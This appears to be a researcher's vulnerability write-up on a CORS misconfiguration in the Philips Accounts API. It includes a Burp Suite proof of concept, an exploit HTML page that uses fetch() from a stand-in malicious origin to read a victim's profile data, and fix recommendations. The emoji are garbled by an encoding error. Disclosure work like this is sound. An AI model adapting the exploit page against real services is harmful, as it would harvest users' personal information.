# ğŸ”“ Philips Accounts CORS Misconfiguration Vulnerability

## ğŸ“Œ Summary

A **Cross-Origin Resource Sharing (CORS)** misconfiguration was identified in the Philips Accounts API, allowing malicious websites ğŸŒ to make authenticated API requests on behalf of a victim ğŸ§‘â€ğŸ’» and access sensitive personal information ğŸ”.

## ğŸ›‘ Vulnerability Details

The Philips accounts endpoint improperly reflects and allows requests from arbitrary origins, such as:
`Access-Control-Allow-Origin: https://www.EVIL.in`

âš ï¸ This insecure configuration permits **malicious websites** to make authenticated API requests from the victimâ€™s browser and **read sensitive information**.

### ğŸ§¾ Sensitive Information Exposed
- ğŸ“§ Full name and email
- ğŸ†” UID and Global Subject ID
- ğŸ—“ï¸ Consent flags and timestamps
- ğŸš» Gender and ğŸŒ country information
- âœ… Verified email status

## ğŸ§ª Proof of Concept (PoC)

### 1ï¸âƒ£ Request Crafted in Burp Suite ğŸ
A forged `Origin` header was sent with the value `https://www.EVIL.in`.  
The server responded with `Access-Control-Allow-Origin: https://www.EVIL.in`, allowing cross-origin access.

#### ğŸ“¸ Screenshot:
![IMG_9232](https://github.com/user-attachments/assets/fb1a6e0d-0fb2-4edf-88a9-3ad1b60a62a3)



### 2ï¸âƒ£ Live Exploit Demonstration ğŸ’¥
A crafted HTML page hosted on a malicious domain successfully retrieved the victimâ€™s user info.

**ğŸ’» Exploit HTML:**  
```html
<!DOCTYPE html>
<html>
<head>
  <title>Philips CORS Exploit</title>
</head>
<body>
  <h2>Exploit Demo</h2>
  <button onclick="exploit()">Get Philips User Info</button>
  <pre id="output"></pre>

  <script>
    async function exploit() {
      try {
        const res = await fetch("<PHILIPS><END-POINT>", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer <valid_token>"
          },
          body: "{}"
        });

        const data = await res.json();
        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        document.getElementById("output").textContent = "Error: " + err;
      }
    }
  </script>
</body>
</html>
```

### ğŸ“¸ Live Exploit Output:
![IMG_9233](https://github.com/user-attachments/assets/4b05d85f-f48b-44db-9dcd-a1d0cecdec8c)

## ğŸ“‰ Impact

This vulnerability allows any malicious website to:
- ğŸ“¤ Exfiltrate personal user information from authenticated Philips sessions.
- ğŸ“Š Conduct unauthorized data harvesting and identity profiling.
- ğŸš« Bypass Same-Origin Policy protections.


## ğŸ›  Recommendations

- âœ… Implement a strict CORS policy allowing only trusted origins via a whitelist.
- âŒ Avoid reflecting unvalidated Origin headers.
- ğŸ›¡ Protect all sensitive endpoints with CSRF and strict CORS controls.
   ğŸ” Regularly audit APIs for misconfigurations.

## ğŸ§  What I have Learnt

Every â€œNoâ€ ğŸ“‰ teaches us something new ğŸ“š and pushes us to come back stronger ğŸ’ªâš¡

Signing off


